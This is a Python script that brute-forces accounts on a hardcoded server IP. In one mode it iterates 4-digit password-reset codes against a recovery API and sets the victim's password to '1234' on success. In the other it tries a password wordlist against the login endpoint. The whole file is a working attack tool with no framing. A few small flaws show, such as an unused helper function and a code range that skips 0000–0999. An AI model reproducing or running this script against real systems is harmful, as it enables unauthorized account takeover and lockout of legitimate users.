import requests
import argparse

RECOVERY_ENDPOINT = 'http://91.191.173.36:5000/api/password_recovery'
LOGIN_ENDPOINT = 'http://91.191.173.36:5000/login'
PASSWORD_LIST = 'passwords.txt'


def try_reset_code(username, code):
    # Make a POST request to the endpoint with the code
    data = {'code': code}
    response = requests.post(RECOVERY_ENDPOINT.format(username=username), data=data)
    return response.status_code == 302


def brute_recovery(username):
    # Try all possible combinations of the reset code
    for i in range(1000, 10000):
        print('Trying code: {}'.format(i))
        # Set the reset code
        code = str(i).zfill(4)
        # Send a POST request to the API with the username, reset code, and new password
        data = {'username': username, 'reset-code': code, 'new-password': '1234'}
        response = requests.post(RECOVERY_ENDPOINT, json=data).json()
        # Check if the password was successfully changed
        if response['result'] == 'Success! Changed password.':
            print(f'Found the correct reset code: {code}')
            print('Changed password to 1234')
            break
        else:
            print(f'Incorrect reset code: {code}')


def try_login(username, password):
    # Send a POST request to the login endpoint with the given username and password
    data = {'username': username, 'password': password}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(LOGIN_ENDPOINT, data=data, headers=headers)
    print('Trying username: {} and password: {}'.format(username, password))
    if response.status_code == 200:
        print('Logged in with username: {} and password: {}'.format(username, password))
        return True
    return False


def brute_login(username):
    # Try all passwords in the password list
    with open(PASSWORD_LIST) as f:
        for password in f:
            if try_login(username, password.strip()):
                return
    print(f'Could not find correct password for {username}')


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('username', help='Username to brute force')
    parser.add_argument('mode', help='Brute force mode: recovery or login')
    args = parser.parse_args()
    if args.mode == 'recovery':
        brute_recovery(args.username)
    elif args.mode == 'login':
        brute_login(args.username)
    else:
        print('Invalid mode. Use recovery or login')


if __name__ == '__main__':
    main()
